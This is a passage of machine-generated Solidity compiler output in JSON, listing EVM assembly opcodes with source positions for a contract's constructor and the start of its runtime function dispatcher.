									"end": 932,
									"name": "tag",
									"source": 9,
									"value": "21"
								},
								{
									"begin": 907,
									"end": 932,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 907,
									"end": 932,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "22"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "20"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SLOAD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "AND",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ISZERO",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "100"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "MUL",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SUB",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "AND",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "2"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DIV",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "MSTORE",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "20"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "KECCAK256",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1F"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "20"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DIV",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1F"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "LT",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "24"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPI",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "MLOAD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "FF"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "NOT",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "AND",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP4",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "OR",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP6",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SSTORE",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "23"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "24"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP6",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SSTORE",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ISZERO",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "23"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPI",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "25"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "GT",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ISZERO",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "26"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPI",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "MLOAD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SSTORE",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "20"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "25"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "26"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "23"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "27"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "28"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9,
									"value": "[in]"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "27"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9,
									"value": "[out]"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "28"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "29"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP3",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "GT",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ISZERO",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "30"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPI",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SSTORE",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "29"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "30"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "SWAP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMP",
									"source": 9,
									"value": "[out]"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "tag",
									"source": 9,
									"value": "22"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH #[$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH [$]",
									"source": 9,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "CODECOPY",
									"source": 9
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "RETURN",
									"source": 9
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220664f2c069f54542f06f10b881b37e7a4b454ddffd1ffc08a7398478d351fde5f64736f6c634300060c0033",
									".code": [
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "80"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "4"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "CALLDATASIZE",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "CALLDATALOAD",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "E0"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "SHR",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "7D53D433"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "3"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "BE9A6555"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "4"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "D4E93292"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "5"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "E1812F05"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "6"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "tag",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "CALLDATASIZE",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "STOP",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "tag",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 625,
											"end": 17573,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "3"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "CALLVALUE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "9"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "9"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "10"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "11"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "10"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "12"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "14"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP5",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "12"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "14"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "15"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "EXP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "tag",
											"source": 9,
											"value": "15"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 688,
											"end": 710,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 688,
											"end": 710,
											"name": "RETURN",
											"source": 9
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "tag",
											"source": 9,
											"value": "4"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "16"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "17"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "tag",
											"source": 9,
											"value": "16"
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15388,
											"end": 15575,
											"name": "STOP",
											"source": 9
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "tag",
											"source": 9,
											"value": "5"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "18"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "19"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "tag",
											"source": 9,
											"value": "18"
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 15693,
											"end": 15883,
											"name": "STOP",
											"source": 9
										},
										{
											"begin": 655,
											"end": 681,
											"name": "tag",
